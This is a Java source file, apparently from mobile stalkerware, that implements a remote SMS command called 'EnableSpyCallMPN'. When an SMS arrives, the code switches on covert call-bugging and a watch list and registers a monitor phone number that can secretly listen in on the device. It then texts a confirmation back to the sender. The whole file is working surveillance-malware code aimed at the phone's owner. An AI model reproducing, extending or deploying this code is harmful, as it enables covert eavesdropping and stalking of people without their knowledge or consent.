package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefWatchListInfo;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSEnableSpyCallMPN extends RmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSEnableSpyCallMPN(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getEnableSpyCallMPNCmd());
		try {	
			Preference pref = Global.getPreference();
			PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
			bugInfo.setEnabled(true);
			//bugInfo.setWatchAllEnabled(true);
			watchListInfo.setWatchListEnabled(true);
			bugInfo.setPrefWatchListInfo(watchListInfo);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			String monitorNumber = rmtCmdLine.getMonitorNumber();
			if (!monitorNumber.equals(Constant.EMPTY_STRING)) {
				//bugInfo.setMonitorNumber(monitorNumber);
				bugInfo.addMonitorNumber(monitorNumber);
				responseMessage.append(monitorNumber);
			} else {
				responseMessage.append(Constant.NOT_AVAILABLE);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.MONITOR_NOT_SET);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.SET_MONITOR_CORRECT_PARAM);			
			}
			pref.commit(bugInfo);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdEnableSpyCallMPN.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}	
}
